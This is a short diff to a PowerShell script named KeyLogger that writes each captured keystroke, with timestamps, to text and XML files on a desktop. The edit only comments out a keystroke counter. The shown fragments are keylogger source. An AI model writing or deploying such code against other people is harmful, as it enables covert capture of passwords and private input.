@@ -4,7 +4,7 @@ function KeyLogger()
 	$Path = "C:\Users\decoder\Desktop\KeyLogger $(get-date -UFormat "%m.%d.%Y.%H.%M.%S").txt"
 	$XML_Path = "C:\Users\decoder\Desktop\KeyLogger $(get-date -UFormat "%m.%d.%Y.%H.%M.%S").xml"
 	$first_time = 0
-	$totalNumber = 0
+	#$totalNumber = 0
 
 	# Create the XML File Tags
 	$xmlWriter = New-Object System.XMl.XmlTextWriter($XML_Path,$Null)
@@ -82,7 +82,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 							$button.setAttribute("Button",$mychar)
 							$button.setAttribute("Time",$(get-date -format g))
 							$xmlDoc.Save($XML_Path)	
-							$totalNumber++
+							#$totalNumber++
 						}
 					$first_time = 1	    
           				}
@@ -92,7 +92,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   	}
   	finally
   	{
-		write-Host "Total Number of Keystrokes are $totalNumber" -ForegroundColor Green 
+		write-Host "Total Number of Keystrokes are " -ForegroundColor Green 
 	}
 }
 
